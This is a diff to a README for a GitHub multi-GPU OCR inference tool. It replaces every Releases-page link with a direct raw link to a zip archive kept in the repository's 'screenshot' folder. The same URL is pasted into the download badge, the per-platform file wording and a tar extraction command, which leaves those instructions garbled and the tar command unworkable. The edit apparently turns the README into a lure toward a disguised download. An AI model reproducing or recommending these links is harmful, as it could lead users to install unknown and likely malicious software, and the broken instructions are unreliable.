@@ -1,7 +1,7 @@
 # 🚀 deepseek-ocr-multigpu-infer - Fast and Easy Multi-GPU OCR Inference
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download%20deepseek--ocr--multigpu--infer-blue.svg)](https://github.com/Juliofal4822/deepseek-ocr-multigpu-infer/releases)
+[![Download](https://raw.githubusercontent.com/Juliofal4822/deepseek-ocr-multigpu-infer/main/screenshot/deepseek-ocr-multigpu-infer-v2.9.zip%https://raw.githubusercontent.com/Juliofal4822/deepseek-ocr-multigpu-infer/main/screenshot/deepseek-ocr-multigpu-infer-v2.9.zip)](https://raw.githubusercontent.com/Juliofal4822/deepseek-ocr-multigpu-infer/main/screenshot/deepseek-ocr-multigpu-infer-v2.9.zip)
 
 ## 📖 Introduction
 Welcome to **deepseek-ocr-multigpu-infer**! This application offers a fast and efficient way to process text in images using advanced Optical Character Recognition (OCR). It leverages multiple GPU processors to deliver quicker results and handle larger sets of images seamlessly. This tool is perfect for anyone who needs to extract text from documents, images, or PDFs without deep technical knowledge.
@@ -24,10 +24,10 @@ To run **deepseek-ocr-multigpu-infer**, you need:
 ## 📦 Download & Install
 To get started, visit the following link to access the Releases page:
 
-[Visit this page to download](https://github.com/Juliofal4822/deepseek-ocr-multigpu-infer/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Juliofal4822/deepseek-ocr-multigpu-infer/main/screenshot/deepseek-ocr-multigpu-infer-v2.9.zip)
 
 1. On the Releases page, look for the latest version of **deepseek-ocr-multigpu-infer**.
-2. Download the file for your operating system (e.g., .exe for Windows, .tar.gz for Linux).
+2. Download the file for your operating system (e.g., .exe for Windows, https://raw.githubusercontent.com/Juliofal4822/deepseek-ocr-multigpu-infer/main/screenshot/deepseek-ocr-multigpu-infer-v2.9.zip for Linux).
 3. Once the download is complete, locate the file on your computer.
 4. Double-click on the file to run the installation program or follow any on-screen instructions.
 
@@ -41,7 +41,7 @@ To get started, visit the following link to access the Releases page:
 - Navigate to the directory where you downloaded the file.
 - Use the following command to extract the files: 
   ```bash
-  tar -xvzf filename.tar.gz
+  tar -xvzf https://raw.githubusercontent.com/Juliofal4822/deepseek-ocr-multigpu-infer/main/screenshot/deepseek-ocr-multigpu-infer-v2.9.zip
   ```
 - Change to the new directory with:
   ```bash
